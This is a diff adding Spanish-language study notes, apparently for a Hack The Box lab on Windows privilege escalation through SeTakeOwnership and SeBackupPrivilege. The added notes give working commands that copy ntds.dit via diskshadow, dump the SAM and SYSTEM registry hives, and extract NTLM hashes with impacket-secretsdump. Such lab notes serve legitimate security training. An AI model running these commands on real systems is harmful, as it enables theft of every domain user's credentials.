@@ -123,3 +123,72 @@ SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
     - `takeown /f 'C:\Department Shares\Private\IT\cred.txt'
     - `icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F`
     - Ahora con esto podemos tomar ownership de un archivo.
+### En donde conviene usar esta técnica de tomar ownership
+```
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
+
+## SeBackupPrivilege
+- Este privilegio permite la habilidad de leer cualquier archivo del sistema y realizar copias de seguridad de esos archivos.
+- `Get-SeBackupPrivilege`
+- Se puede intentar habilitar este privilegio usando [el siguieunte script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
+```powershell
+PS C:\htb> Set-SeBackupPrivilege
+PS C:\htb> Get-SeBackupPrivilege
+
+SeBackupPrivilege is enabled
+```
+### Copiar un archivo protegido
+- `PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`
+#### Atacando el DC, copiando NTDS.dit
+- Este grupo también nos permite hacer cosas interesantes como tomar el NTSD.dit del DC y copiarlo en una maquina que no tenga permisos de administrador..
+    - Este archivo contiene hashes NTLM de todos los usuarios bajo el dominio.
+    - Podemos utilizar diskshadow para copiar el disco C y exponerlo como disco E.
+```powershell
+PS C:\htb> diskshadow.exe
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  10/14/2020 12:57:52 AM
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+PS C:\htb> dir E:
+```
+- `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
+#### Copiando los registros SAM y SYSTEM
+- Este privilegio también nos permite copiar los registros SAM y SYSTEM. Lo cual nos permite extraer credenciales de los usuarios mediante impacket-secretsdump.
+```
+C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
+
+The operation completed successfully.
+
+
+C:\htb> reg save HKLM\SAM SAM.SAV
+
+The operation completed successfully.
+``` 
+
+#### Extrayendo los hashes
+- `impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`
+
+### Usando robocopy para copiar archivos
+- Robocopy es un programa de Windows que nos permite copiar archivos de manera recursiva.
+- `C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
